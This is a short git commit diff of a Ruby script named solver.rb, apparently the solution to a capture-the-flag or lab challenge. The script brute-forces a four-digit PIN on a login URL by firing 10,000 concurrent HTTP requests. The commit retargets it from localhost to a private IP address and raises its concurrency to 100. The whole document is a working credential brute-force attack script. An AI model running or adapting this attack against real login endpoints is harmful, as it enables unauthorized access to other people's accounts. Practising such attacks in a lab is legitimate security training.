3552af9fefb8fd3b025cc5de7b8e79a64e11457a
Robert Clark <rbclark@mitre.org>
2016-09-02 16:46:57 -0400

    Cleaned up solver slightly.

--- solver.rb
+++ solver.rb
@@ -1,22 +1,17 @@
 require 'typhoeus'
 
-urls = (0..9999).map{ |num| "http://localhost/login/donutsAreGr8/#{'%04d' % num.to_s}"}
+urls = (0..9999).map{ |num| "http://10.0.1.31/login/donutsAreGr8/#{'%04d' % num.to_s}"}
 
-hydra = Typhoeus::Hydra.new
-
-successes = 0
+hydra = Typhoeus::Hydra.new(max_concurrency: 100)
 
 urls.each do |url|
     request = Typhoeus::Request.new(url, timeout: 15000)
     request.on_complete do |response|
         if response.success?
             puts "Successfully requested " + url + response.body
-            successes += 1
         end
     end
     hydra.queue(request)
 end
 
 hydra.run
-
-puts "Fetched all urls!" if successes == urls.length
